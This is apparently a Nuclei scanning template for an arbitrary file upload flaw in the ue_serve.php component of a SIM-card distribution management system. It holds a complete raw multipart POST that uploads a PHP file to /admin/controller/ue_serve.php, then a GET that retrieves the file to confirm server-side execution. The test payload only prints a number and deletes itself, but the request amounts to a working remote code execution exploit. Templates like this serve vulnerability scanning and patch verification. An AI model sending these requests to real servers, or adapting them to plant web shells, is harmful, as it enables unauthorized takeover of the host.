id: haoka-file-upload

info:
  name: 号卡极团分销管理系统 ue_serve.php 组件任意文件上传漏洞
  author: Unknown
  severity: critical
  description: 号卡极团分销管理系统中的 ue_serve.php 接口存在任意文件上传缺陷。攻击者可通过构造恶意文件上传请求，在目标服务器存储可执行代码文件，进而通过远程代码执行实现权限提升。该漏洞允许未经授权的实体在Web容器上下文中部署持久化攻击载荷，最终可能导致整个服务器环境被完全接管。
  tags: 号卡极团

flow: |
  http(1) && http(2)

http:
- raw:
  - |
    POST /admin/controller/ue_serve.php?action=image&encode=utf-8 HTTP/1.1
    Host: {{Hostname}}
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylkv1kpsZgzw2WC03

    ------WebKitFormBoundarylkv1kpsZgzw2WC03
    Content-Disposition: form-data; name="name"

    test.php
    ------WebKitFormBoundarylkv1kpsZgzw2WC03
    Content-Disposition: form-data; name="upfile"; filename="test.php"
    Content-Type: image/jpeg

    <?php print(111*222);unlink(__FILE__);?>
    ------WebKitFormBoundarylkv1kpsZgzw2WC03--
  extractors:
  - type: regex
    part: body
    name: uploadfile
    group: 1
    regex:
    - '(\w+_test\.php)'
    internal: true
- raw:
  - |
    GET /upload/{{uploadfile}} HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '24642'
  - type: status
    status:
    - 200
